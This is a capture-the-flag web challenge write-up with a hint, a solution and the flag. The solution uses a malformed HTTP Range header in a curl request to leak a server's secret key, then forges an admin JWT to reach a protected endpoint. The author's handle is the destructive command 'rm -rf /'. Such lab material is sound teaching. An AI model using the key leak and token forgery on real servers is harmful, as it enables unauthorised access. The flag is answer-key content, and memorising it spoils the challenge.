# Our Files Are Belong Only To Us
---
### Category: Web Exploitation
### Author: Joshua Novak (rm -rf /)
## Description
---
Our specialized file server works both locally and over the internet. Not only that, the important stuff is quite secure.
There's no way people will be able to read the files we don't want them to. Our code is invulnerable!

## Hints
--- 
1. Are you in range? Maybe you need to take a step or two back.

## Solution
---
1. Create a web request to http://<ADDRESS HERE>/a_email_347314h12lkdh2001_2004_04_12.eml with a http header of "Range: bytes=--1", i.e., curl -H "Range: bytes=--1" <addr>/<path>
2. Get the secret key from the response from #1
3. Generate a JWT token with the following (you can use https://jwt.io/ to generate it)
  - Header: { "alg": "HS256", "typ": "JWT" }
  - Payload: { "username": "admin" }
  - Secret key: the key you got from #2
4. Send a request to http://<ADDRESS HERE>/flag with the `Authorization: Bearer <JWT token>` http header to get a response with the flag (there will be a lot of garbage text too

## Flag
magpie{G0_T3LL_1T_0N_TH3_M0UNT41N_TH4T_JWT_W45_F0RM3D}
